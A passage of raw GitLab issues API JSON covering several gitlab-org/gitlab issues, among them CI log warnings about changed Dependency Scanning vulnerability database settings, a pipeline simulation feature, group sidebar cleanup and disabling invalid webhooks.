intelligence","section::growth","workflow::blocked"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"}],"author":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"type":"ISSUE","assignee":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"user_notes_count":21,"merge_requests_count":3,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337300","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":2},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337300","notes":"https://gitlab.com/api/v4/projects/278964/issues/337300/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337300/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337300","relative":"#337300","full":"gitlab-org/gitlab#337300"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6309,"epic":{"id":303192,"iid":6309,"title":"Pseudonymization MVC","url":"/groups/gitlab-org/-/epics/6309","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91147913,"iid":337296,"project_id":278964,"title":"Warn in logs about Dependency Scanning jobs security risks","description":"\u003c!-- This issue template can be used a great starting point for feature requests. The last section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab. --\u003e\n\n### Release notes \n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve \n\nAs a user with Dependency Scanning jobs running in my project pipeline, I want to be warned when these a scanning job use vulnerability databases that might be outdated. In particular, I want to be warned when:\n- The vulnerability DB being used is not the one maintained by GitLab.\n- The update of the vulnerability DB has been disabled.\n- The scanner has been configured to fetch a particular version/git ref of the vulnerability DB.\n\nI still want to be able to customize Dependency Scanning using [supported CI variables](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/index.html#configuring-specific-analyzers-used-by-dependency-scanning).\n\n### Further details\n\nHere are the relevant [variables](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/index.html#configuring-specific-analyzers-used-by-dependency-scanning):\n\n```\nBUNDLER_AUDIT_UPDATE_DISABLED\nBUNDLER_AUDIT_ADVISORY_DB_URL\nBUNDLER_AUDIT_ADVISORY_DB_REF_NAME\n\nGEMNASIUM_DB_UPDATE_DISABLED\nGEMNASIUM_DB_REMOTE_URL\nGEMNASIUM_DB_REF_NAME\n\nRETIREJS_JS_ADVISORY_DB\nRETIREJS_NODE_ADVISORY_DB\n```\n\nIt might be relevant to warn about `RETIREJS_ADVISORY_DB_INSECURE` being set, but this is out of scope.\n\n### Implementation plan\n\nThis issue is concentrated only on adding this warning to logs. More to expect with https://gitlab.com/gitlab-org/gitlab/-/issues/347546\n\n- In the Dependency Scanning CI template add a check for the aforementioned CI variables.\n- If those variables are set to not-default values, add a message in CI Logs.\n- Add a section in the documentation https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#troubleshooting explaining this warning and how to fix it\n- Add a link to this documentation to the warning.\n\nThis is similar to https://gitlab.com/gitlab-org/gitlab/-/issues/337295.\n\n\u003c!--- Use the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n\nConsider adding related issues and epics to this issue. You can also reference the Feature Proposal Template (https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md) for additional details to consider adding to this issue. Additionally, as a data oriented organization, when your feature exits planning breakdown, consider adding the `What does success look like, and how can we measure that?` section.\n\nOther sections to consider adding: \n\n### Intended users\n\nWho will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) \n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops) \n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n\n\n### User experience goal\n\nWhat is the single user experience workflow this problem addresses? \nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ \n\n\n### Further details\n\nInclude use cases, benefits, goals, or any other details that will help us understand the problem better. \n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members \n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members \n\n### Documentation\n\n See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html \n\n--\u003e\n\n### Availability \u0026 Testing\n\nIntegration tests to be added to test the scenarios\n\n- The vulnerability DB being used is not the one maintained by GitLab.\n- The update of the vulnerability DB has been disabled.\n- The scanner has been configured to fetch a particular version/git ref of the vulnerability DB.\n\n\u003c!--\n\n### What does success look like, and how can we measure that?\n\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. \n\n### What is the type of buyer?\n\nWhat is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#three-tiers\n--\u003e\n\n### Is this a cross-stage feature?\n\nTo be checked. It might apply to other security scanning jobs that are highly customizable, and that expose CI variables one could use to exclude vulnerabilities/rules.","state":"closed","created_at":"2021-07-30T11:10:01.544Z","updated_at":"2022-07-13T11:41:03.035Z","closed_at":"2022-05-18T19:25:33.335Z","closed_by":{"id":5292351,"username":"sam.white","name":"Sam White","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d467fb024d1858d279e6a36e028436ac?s=80\u0026d=identicon","web_url":"https://gitlab.com/sam.white"},"labels":["Category:Dependency Scanning","GitLab Ultimate","[deprecated] Accepting merge requests","backend","devops::secure","documentation","feature::addition","group::composition analysis","quad-planning::complete-action","section::sec","type::feature","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"type":"ISSUE","assignee":null,"user_notes_count":19,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337296","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337296","notes":"https://gitlab.com/api/v4/projects/278964/issues/337296/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337296/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337296","relative":"#337296","full":"gitlab-org/gitlab#337296"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91130939,"iid":337286,"project_id":278964,"title":"Clean group menus after refactoring","description":"After we've migrated all the group menus, we need to clean some code that we needed for the refactor. In particular:\n\n- [remove code comments in the main partial](https://gitlab.com/gitlab-org/gitlab/blob/master/app/views/layouts/nav/sidebar/_group.html.haml#L1)\n- [remove the partial we used to store the non refactored menu](https://gitlab.com/gitlab-org/gitlab/blob/master/app/views/layouts/nav/sidebar/_group_menus.html.haml#L1)\n- [remove the method that includes the partial with non refactored menus](https://gitlab.com/gitlab-org/gitlab/blob/master/lib/sidebars/groups/panel.rb#L15)\n- Remove associated helpers methods. The main helper method is [group_sidebar_links?](https://gitlab.com/gitlab-org/gitlab/blob/master/app/helpers/groups_helper.rb#L41) but it calls other methods that aren't necessary and it also has EE overrides.","state":"closed","created_at":"2021-07-30T05:31:31.752Z","updated_at":"2022-03-16T11:40:11.782Z","closed_at":"2021-08-20T14:07:29.947Z","closed_by":{"id":955795,"username":"fjsanpedro","name":"Francisco Javier López","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/955795/avatar.png","web_url":"https://gitlab.com/fjsanpedro"},"labels":["Category:Navigation \u0026 Settings","Deliverable","backend","devops::create","group::editor","section::dev","type::maintenance"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":955795,"username":"fjsanpedro","name":"Francisco Javier López","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/955795/avatar.png","web_url":"https://gitlab.com/fjsanpedro"}],"author":{"id":955795,"username":"fjsanpedro","name":"Francisco Javier López","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/955795/avatar.png","web_url":"https://gitlab.com/fjsanpedro"},"type":"ISSUE","assignee":{"id":955795,"username":"fjsanpedro","name":"Francisco Javier López","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/955795/avatar.png","web_url":"https://gitlab.com/fjsanpedro"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337286","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337286","notes":"https://gitlab.com/api/v4/projects/278964/issues/337286/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337286/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337286","relative":"#337286","full":"gitlab-org/gitlab#337286"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5819,"epic":{"id":254641,"iid":5819,"title":"Group sidebar code refactor","url":"/groups/gitlab-org/-/epics/5819","group_id":9970,"human_readable_end_date":"Sep 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91130316,"iid":337283,"project_id":278964,"title":"Documentation for patterns for removing cross-joins","description":"Document known patterns for removing joins between `ci_*` and non `ci_*` tables based on real examples.","state":"closed","created_at":"2021-07-30T05:11:53.265Z","updated_at":"2022-05-31T12:22:05.266Z","closed_at":"2021-08-16T08:55:34.859Z","closed_by":{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"},"labels":["Category:Pods","devops::data_stores","documentation","group::pods","section::enablement"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"}],"author":{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"},"type":"ISSUE","assignee":{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337283","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337283","notes":"https://gitlab.com/api/v4/projects/278964/issues/337283/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337283/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337283","relative":"#337283","full":"gitlab-org/gitlab#337283"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6103,"epic":{"id":281355,"iid":6103,"title":"Decomposition: Support for many databases","url":"/groups/gitlab-org/-/epics/6103","group_id":9970,"human_readable_end_date":"Sep 16, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91129899,"iid":337282,"project_id":278964,"title":"Frontend: MVC Iteration: Simulate pipeline under conditions: `git push event to the default branch`","description":"\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n\n### Release notes\n\nCreating a complex pipeline configuration requires trial and error, and every time you commit a faulty configuration you need to wait for the pipeline to run to realize there's a problem.\n\nCurrently, it's possible to validate the pipeline syntax statically in the pipeline editor, but we don't evaluate the pipeline logic like `rules` and `needs` job dependencies.\n\nIn this release, we've added the ability to test the pipeline creation before running the pipeline, which takes into consideration the different rules you've configured on your pipeline.\n\n## 🧩 Problem\n\nCreating a complex pipeline configuration requires trial and error, and every time you commit faulty configuration you need to wait for the pipeline to run to realize there's a problem.\n\nCurrently, it's possible to validate the pipeline syntax statically in the pipeline editor, but we don't evaluate the pipeline logic like `rules` and `needs` job dependencies.\n\nThe standalone CI Lint tool offers an option to simulate the pipeline for the default branch, but that feature is not discoverable, not well documented, and is difficult to understand what it does from how it's presented in the Linter UI.\n\n#### Intended users\n\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n#### Metrics \n\n- We can measure the usage of this feature by tracking the click events on the \"Validate pipeline\" button. \n- We will further gather feedback on this feature by linking a [feedback issue](https://gitlab.com/gitlab-org/gitlab/-/issues/346687) in the `?` popover next to the dropdown.\n\n:point_up: Feedback issue needs to be refined.\n\n\u003c!-- How are you going to track uage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n--\u003e\n\n#### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses?\nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e\n\nThe user should be able to validate their pipeline under selected conditions. In the MVC iteration, only one type of condition will be available (a git push event for the default branch).\n\n## ✨ Proposal\n\n- Move the existing pipeline simulation functionality to the pipeline editor Validate tab (currently called Lint).\n- The tab content will be replaced with the simulation functionality which will validate the pipeline on demand (including the syntax and logic).\n\n#### Feature acceptance criteria\n\n- In order to drive the feature usage and encourage feedback, we will show a `NEW` badge in the Validate tab the first time the user opens the Validate tab after the feature release. The badge should disappear once you close the Validate tab after your first interaction with it upon the feature release.\n- The `Pipeline source` dropdown with a pre-selected option will be added to the Validate tab. No other choices will be available yet and the button will be disabled. In the future we will add more options and inputs to that controls bar.\n- The `?` button will open a popover with supplemental content and docs + [feedback issue links.](https://gitlab.com/gitlab-org/gitlab/-/issues/346687)\n- The simulation empty state will explain the details of what happens during the simulation.\n- The simulation will run with the current content of the Edit tab input. \n- While the simulation is running, we will show a loading state.\n- Simulation can be stopped by clicking on the \"Cancel\" button.\n- Closing the page should continue running the simulation in the background. We will only stop the simulation if you cancel it by clicking on the `cancel` button as the simulation is running.\n- When the simulation completes, we will show either a \"success\" or \"error\" alert **with updated UI copy** to indicate whether any errors were found in the simulation. The error messages will appear below the alert in case there are errors.\n- The continuous syntax validation widget will work unrelated to the results of the simulation and will only show the syntax status. The text of the syntax validation widget will be updated to reflect the scope of that validation (syntax only).\n- Closing the Editor page will reset content of the Validate tab to the empty state. \n- If the contents of the configuration or the branches change, we'll show a UI text note next to the Validate button notifying the developer that the config has changed.\n\n#### Design specs \n\n:link: [Designs](https://gitlab.com/gitlab-org/gitlab/-/issues/337282/designs/Validate_tab_-_badge.png)\n\n:link: [Figma specs](https://www.figma.com/file/O1iQx5kEr3UK1cTYu1qFnH/%F0%9F%92%9CPipeline-Editor?node-id=1924%3A69142)\n\n### Further suggested improvements (out of scope in this issue)\n\n\u003cdetails\u003e\u003csummary\u003eClick to expand\u003c/summary\u003e\n\n- Add additional pipeline conditions and variables support\n- In the future we could reuse the same design in the Visualise tab to allow you to see what the pipeline will _look_ like with certain conditions and/or inputs. \n- It would be great to make this functionality available as an extension of sort for those GitLab CI users who prefer to use their local editor for writing the configuration.\n* User would like to know about these logic errors in real time, without having to run the simulation.\n* Users would like to know more information about the different pipeline conditions.\n* The errors should be more actionable, making it easy to fix the problem in the pipeline editor. (ex. highlight the place where the error occurs in the editor and link to that place from the error).\n* User would like to see the output of what worked correctly in the simulation, up until the error occurred, to see a trace of what happened and where the pipeline configuration \"broke\".\n* The output formatting needs improvement.\n* The status of the latest pipeline can be confused for the status of the current pipeline configuration or simulation.\n\n\u003c/details\u003e\n\n### Permissions and Security\n\nAccording to the current implementation you need to have permissions to push to the the default branch to use the simulation. When you have insufficient access, the current simulation implementation allows you to run the simulation in the UI, but throws an error about insufficient permissions. This is far from ideal experience and needs to be addressed as a follow-up to the MVC.\n\n\u003e You must have permissions to create pipelines on this branch to validate with a simulation.\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\nThis feature needs to be documented in detail on the pipeline editor page, as well as any other page in the docs where we talk about pipeline validation/ linting. We need to cover exactly what checks the simulation performs, as well as its limitations. We can also link the feedback issue in the docs to encourage users to provide feedback. We should make our vision clear that this feature will evolve into allowing you to set specific conditions like branch, pipeline source, variables, etc, to give context for this MVC feature.\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Implementation Table\n\n| ~frontend | MR |\n| ------ | ------ |\n| Introduce feature flag to replace `Lint` tab with `Validate` tab in the pipeline editor | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/89497 |\n| Add popover and `NEW` badge to the `Validate` tab | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/90345 |\n| Add simulation functionality to the `Validate` tab | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/91241 |\n| Roll out feature flag | https://gitlab.com/gitlab-org/gitlab/-/issues/364257 |\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### Available Tier\n\n* Free\n\n\u003c!-- This section should be used for setting the appropriate tier that this feature will belong to. Pricing can be found here: https://about.gitlab.com/pricing/\n\n* Free\n* Premium/Silver\n* Ultimate/Gold\n--\u003e","state":"closed","created_at":"2021-07-30T05:02:10.704Z","updated_at":"2022-09-05T21:08:35.617Z","closed_at":"2022-08-10T04:06:24.503Z","closed_by":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"labels":["Category:Pipeline Authoring","FY23::Q3","GitLab Free","Technical Writing","UX","auto updated","customer","devops::verify","direction","documentation","feature::enhancement","frontend","group::pipeline authoring","missed:14.8","missed:14.9","release post item::in review","section::ops","type::feature","workflow::production"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"}],"author":{"id":4706959,"username":"nadia_sotnikova","name":"Nadia Sotnikova","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4706959/avatar.png","web_url":"https://gitlab.com/nadia_sotnikova"},"type":"ISSUE","assignee":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"user_notes_count":115,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337282","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":3,"blocking_issues_count":1,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337282","notes":"https://gitlab.com/api/v4/projects/278964/issues/337282/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337282/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337282","relative":"#337282","full":"gitlab-org/gitlab#337282"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6498,"epic":{"id":317223,"iid":6498,"title":"Simulate pipeline under different conditions","url":"/groups/gitlab-org/-/epics/6498","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":{"id":61387,"iid":75,"sequence":22,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-05-29T00:05:02.030Z","updated_at":"2022-08-22T00:05:02.161Z","start_date":"2022-08-08","due_date":"2022-08-21","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/61387"},"health_status":null},{"id":91129175,"iid":337280,"project_id":278964,"title":"Disable invalid WebHooks","description":"### About\n\nThis issue was created from this discussion: https://gitlab.com/gitlab-org/gitlab/-/issues/336837#note_634902767.\n\nSome `WebHook` records are invalid and we continue to execute them. This led to the errors in https://gitlab.com/gitlab-org/gitlab/-/issues/336837. We would like to disable invalid web hook records so we don't execute them, and flag them to users so they can make them valid if possible.\n\n### Proposal\n\nAs suggested by @toupeira we could lazily disable these by evaluating `#valid?` on the record at hook execution time. A good candidate for catching all hooks (webhooks and integration hooks) would be somewhere in `WebHookService`, on the worker queue.\n\nWe might want a new property called `active`/`disabled` to toggle disabling hooks https://gitlab.com/gitlab-org/gitlab/-/issues/336837#note_637075696. \n\nWe might want to display disabled webhooks in the ~frontend, and we might want to integrate this aspect with the rate-limiting UI https://gitlab.com/gitlab-org/gitlab/-/issues/331407. \n\nWe might want `#disable!`, `#enable!` and `#backoff!` to integrate with this property so we don't have two system of disabling (`.executable` and `#executable?` will always need to consider the rate-limiting time-based `disabled_until` property though).\n\n### Design source\n\n:pencil2: [Figma project](https://www.figma.com/file/QkTXmhbfZTuyjEaeGYz3Sh/UX-considerations-for-auto-disabled-and-rate-limited-webhooks-%23331407?node-id=915%3A0)","state":"closed","created_at":"2021-07-30T04:25:28.194Z","updated_at":"2022-11-24T18:22:26.012Z","closed_at":"2022-06-06T22:59:53.897Z","closed_by":{"id":10222550,"username":"g.hickman","name":"Grant Hickman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10222550/avatar.png","web_url":"https://gitlab.com/g.hickman"},"labels":["Category:Webhooks","Stretch","backend","devops::manage","feature::addition","frontend","group::integrations","reliability","section::dev","type::feature","workflow::planning breakdown"],"milestone":{"id":1212252,"iid":48,"group_id":9970,"title":"Next 1-3 releases","description":"Issues which are not quite ready to schedule, but should be considered as part of the near-term 